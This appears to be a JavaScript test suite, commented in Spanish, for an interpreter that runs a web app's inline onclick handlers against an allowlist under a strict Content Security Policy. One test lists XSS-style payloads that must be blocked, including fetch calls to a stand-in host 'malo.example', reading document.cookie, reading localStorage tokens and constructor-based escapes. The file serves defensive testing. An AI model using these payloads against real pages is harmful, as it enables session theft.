// CSP sin 'unsafe-inline' en script-src: los manejadores onclick="..." los ejecuta js/safe-handlers.js con una lista permitida (js/handler-allowlist.js).
// Estas pruebas vigilan que (1) todo manejador de la app sea entendido y esté en la lista, (2) index.html no tenga script en línea,
// (3) el intérprete NO ejecute nada fuera de la lista (lo que importa si alguien logra inyectar un onclick).
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { createRequire } from 'node:module';
import { audit, allowlistSource, extractHandlers, extractPropHandlers, dynamicProblem, materialize } from '../scripts/handlers-audit.mjs';

const require = createRequire(import.meta.url);
const SH = require('../js/safe-handlers.js');
const read = (p) => fs.readFileSync(new URL(`../${p}`, import.meta.url), 'utf8');
const html = read('index.html');

/** Corre un manejador con un «window» de mentira; devuelve { res, error }. */
function exec(code, { calls = [], reads = [], win = {}, el = {} } = {}) {
  const allow = (xs) => Object.fromEntries(xs.map((x) => [x, 1]));
  const doc = { getElementById: () => null, querySelector: () => null, querySelectorAll: () => [] };
  try { return { res: SH.run(code, { this: el, event: { preventDefault() {}, stopPropagation() {} }, win, doc, allowCalls: allow(calls), allowReads: allow(reads) }) }; } catch (error) { return { error }; }
}

test('todo manejador en línea de la app es entendido por el intérprete y está en la lista permitida (si falla: node scripts/handlers-audit.mjs --write)', () => {
  const a = audit();
  assert.deepEqual(a.failures.map((f) => `${f.where}: ${f.why}`), [], 'manejadores que el intérprete no entiende: refactorizar a una función con nombre');
  assert.deepEqual(a.badMethods, []);
  assert.deepEqual(a.badNames, []);
  assert.ok(a.handlers.length > 600, `se esperaban cientos de manejadores, hay ${a.handlers.length}`);
  assert.equal(read('js/handler-allowlist.js').replace(/\r\n/g, '\n'), allowlistSource(a), 'js/handler-allowlist.js desactualizada: node scripts/handlers-audit.mjs --write');
});

test('la lista permitida no contiene nada peligroso (fetch, eval, cookie, open, setTimeout...)', () => {
  const a = audit();
  for (const n of [...a.calls, ...a.reads]) {
    assert.ok(!SH.NEVER.test(n) && !SH.NEVER.test(n.split('.').pop()), `nombre prohibido en la lista: ${n}`);
  }
});

test('index.html: sin <script> con código en línea, sin javascript: y sin unsafe-inline en script-src', () => {
  const csp = /http-equiv="Content-Security-Policy" content="([^"]+)"/.exec(html)?.[1];
  assert.ok(csp);
  assert.match(csp, /script-src 'self'/);
  assert.doesNotMatch(csp.match(/script-src[^;]*/)[0], /unsafe-inline|unsafe-eval/);
  const inline = [...html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi)].filter(([, attrs, body]) => !/\bsrc=/.test(attrs) && !/type="application\/ld\+json"/.test(attrs) && body.trim());
  assert.deepEqual(inline.map((m) => m[2].trim().slice(0, 60)), [], 'quedan scripts en línea: moverlos a un archivo');
  assert.doesNotMatch(html, /href="javascript:/i);
  // El orden importa: el intérprete se instala antes que cualquier botón o evento de carga.
  assert.ok(html.indexOf('src="js/safe-handlers.js') < html.indexOf('rel="stylesheet"'), 'safe-handlers.js tiene que cargar antes que las hojas con onload');
  assert.ok(html.indexOf('src="js/handler-allowlist.js') < html.indexOf('src="js/safe-handlers.js'));
});

test('el intérprete ejecuta lo normal: llamadas permitidas, this, return false, cortocircuito, ?. y objetos JSON', () => {
  const log = [];
  const win = { openX: (...a) => log.push(['openX', ...a]), flag: true };
  const base = { calls: ['openX', 'nope'], reads: ['flag', 'nope'], win };
  assert.equal(exec("window.openX(1, 'a')", base).error, undefined);
  assert.deepEqual(log, [['openX', 1, 'a']]);
  assert.equal(exec('typeof window.nope === "function" && window.nope()', base).error, undefined);
  assert.equal(exec('window.nope?.()', base).error, undefined, '?. con algo inexistente no falla');
  assert.equal(exec('window.openX(1); return false', base).res, false);
  const el = { value: 'a', checked: false, style: {} };
  assert.equal(exec("this.value = 'b'; this.checked = true; this.style.display = 'none'", { ...base, el }).error, undefined);
  assert.deepEqual([el.value, el.checked, el.style.display], ['b', true, 'none']);
  assert.equal(exec('window.openX({ "id": 7, "tags": ["a", null], "ok": true })', base).error, undefined);
  assert.deepEqual(log.at(-1), ['openX', { id: 7, tags: ['a', null], ok: true }]);
});

test('el intérprete NO ejecuta nada fuera de la lista (lo que haría un onclick inyectado)', () => {
  const hits = [];
  const win = { openX: () => hits.push('openX'), fetch: () => hits.push('fetch'), eval: () => hits.push('eval'), alert: () => hits.push('alert'), document: {}, localStorage: {}, setTimeout: () => hits.push('setTimeout') };
  const base = { calls: ['openX'], reads: [], win };
  const bad = [
    "fetch('https://malo.example/robo')", "window.fetch('https://malo.example')", "eval('1')", "window.eval('1')", 'alert(1)', "setTimeout('x', 1)",
    'document.cookie', "document.body.innerHTML = '<img>'", "this.innerHTML = 'x'", "this.constructor.constructor('return 1')()", 'this.__proto__.x = 1',
    "location = 'https://malo.example'", "window.location.href = 'https://malo.example'", "localStorage.getItem('sb-token')", 'window.localStorage.token',
    '(function(){})()', "(async () => { await fetch('x') })()", "new Function('x')", '`x`', "import('https://malo.example/x.js')", "window.open('https://malo.example')",
    "this.setAttribute('onclick', 'x')", "this.ownerDocument.defaultView.fetch('x')", "[].constructor.constructor('x')()",
  ];
  for (const code of bad) {
    const r = exec(code, base);
    assert.ok(r.error, `debía bloquearse: ${code}`);
    assert.ok(r.error.safeHandlers, `debía ser un bloqueo del intérprete y no un fallo de JS: ${code} -> ${r.error.message}`);
  }
  assert.deepEqual(hits, [], 'nada de lo prohibido llegó a ejecutarse');
  assert.equal(exec('window.openX()', base).error, undefined, 'lo permitido sigue funcionando');
  assert.deepEqual(hits, ['openX']);
});

test('extractHandlers/materialize: interpolaciones, expresiones regulares con comillas y comentarios', () => {
  const src = [
    "const a = `<button onclick=\"window.del(${id}, '${esc(n).replace(/'/g, \"x\")}')\">`;",
    '// onclick="comentario()"',
    '<!-- onclick="otro()" -->',
  ].join('\n');
  const hs = extractHandlers(src);
  assert.equal(hs.length, 1);
  assert.equal(materialize(hs[0].raw), "window.del(0, 'x')");
});

test('el nodo escolar entrega js/boot.js sin direcciones de CDN y su CSP sigue sin unsafe-inline', async () => {
  const { localizeBootScript, localizeIndexHtml } = await import('../school-node/offline-assets.js');
  assert.doesNotMatch(localizeBootScript(read('js/boot.js')), /J \+ '(jszip|driver|jsqr|canvas-confetti)/);
  assert.doesNotMatch(/script-src[^;]*/.exec(localizeIndexHtml(html))[0], /unsafe-inline/);
});

test('manejadores guardados como texto (propiedades onclick y go) también entran a la lista: pases de temporada, modos de reto, mascotas', () => {
  const allow = read('js/handler-allowlist.js');
  for (const n of ['openSeasonPass', 'openWardrobe', 'openQuetzadex', 'GameArena.chooseMode', 'nav', 'GameArena.quickChallenge', 'GameArena.openChallengeFor']) {
    assert.ok(allow.includes(`'${n}'`), `falta ${n} en js/handler-allowlist.js: el botón no haría nada con la CSP activa`);
  }
  const props = extractPropHandlers("const a = { onclick: 'window.openSeasonPass()', go: \"nav('exams')\", x: 1 };");
  assert.deepEqual(props.map((p) => p.raw), ['window.openSeasonPass()', "nav('exams')"]);
});

test('un manejador armado en ejecución (el nombre de la función o todo el texto) se rechaza en la auditoría: con la lista no se puede saber qué llamará', () => {
  assert.match(dynamicProblem('§'), /entero en ejecución/);
  assert.match(dynamicProblem("window.§('a')"), /nombre de función/);
  assert.match(dynamicProblem('window.fn§()'), /nombre de función/);
  assert.equal(dynamicProblem("window.respondDuel('§', true)"), '', 'un dato entre comillas está bien');
  assert.equal(dynamicProblem('window.openX(§, §)'), '', 'un número o valor como argumento está bien');
});
